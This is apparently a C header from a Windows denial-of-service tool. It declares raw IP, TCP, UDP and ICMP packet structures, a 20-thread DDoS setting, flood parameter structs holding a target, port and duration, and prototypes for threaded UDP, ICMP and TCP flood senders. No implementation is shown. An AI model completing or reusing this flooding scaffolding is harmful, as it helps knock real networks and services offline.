/* tcp/udp/ip/bla structs declarations .... shit i am bored to explain... */

#define ICMP_REQ_DATASIZE 4
#define UDP_REQ_DATASIZE 576
#define TCP_REQ_DATASIZE 4
#define IP_HDRINCL 2
#define ICMP_ECHO_REQUEST 8
#define SYN 0x02 
#define ACK 0x10
#define DDOS_THREADS 20

typedef struct ip_hdr 
{ 
	unsigned char h_verlen; 
	unsigned char tos; 
	unsigned short total_len; 
	unsigned short ident; 
	unsigned short frag_and_flags; 
	unsigned char ttl; 
	unsigned char proto; 
	unsigned short checksum; 
	unsigned int sourceIP; 
	unsigned int destIP; 
} IPHEADER; 

typedef struct tcp_hdr 
{ 
	USHORT th_sport;  
	USHORT th_dport; 
	unsigned int th_seq; 
	unsigned int th_ack; 
	unsigned char th_lenres; 
	unsigned char th_flag;
	USHORT th_win; 
	USHORT th_sum; 
	USHORT th_urp; 
} TCPHEADER; 

typedef struct tagICMPHDR
{ 
    unsigned char icmp_type;
    unsigned char icmp_code; 
    unsigned short icmp_cksum; 
    unsigned short icmp_id;
    unsigned short icmp_seq; 
} ICMPHDR, *PICMPHDR;

typedef struct tagECHOREQUEST
{
	IPHEADER ipHeader;
    ICMPHDR icmpHdr;
    char cData[ICMP_REQ_DATASIZE];
} ECHOREQUEST, *PECHOREQUEST;

typedef struct udphdr
{
    unsigned short sport;	
    unsigned short dport;
    unsigned short Length; 	 
    unsigned short Checksum;
} UDPHDR;

typedef struct psd_hdr  
{ 
	unsigned long saddr;
	unsigned long daddr;  
	char mbz; 
	char ptcl; 
	unsigned short tcpl; 
}PSDHEADER; 

typedef struct _PSHeader 
{
  unsigned long srcaddr;
  unsigned long destaddr;

  unsigned char  zero;
  unsigned char  protocol;
  unsigned short len;

} PSHeader; 

/* multithread packet sending info */
typedef struct UDPPACKET
{
	IPHEADER ipHeader;
    UDPHDR udpHeader;
    char cData[UDP_REQ_DATASIZE];
} UDPPACKET;

typedef struct UDPFLOOD
{
	char target[256];
	int port;
	int time;
} UDPFLOOD;
typedef struct ICMPFLOOD
{
	char target[256];
	int time;
} ICMPFLOOD;
typedef struct TCPFLOOD
{
	char type[32];
	char target[256];
	int port;
	int time;
} TCPFLOOD;

/* functions */

USHORT checksum(USHORT *buffer, int size);
DWORD WINAPI UDP(LPVOID param);
DWORD WINAPI ICMP(LPVOID param);
DWORD WINAPI TCP(LPVOID param);
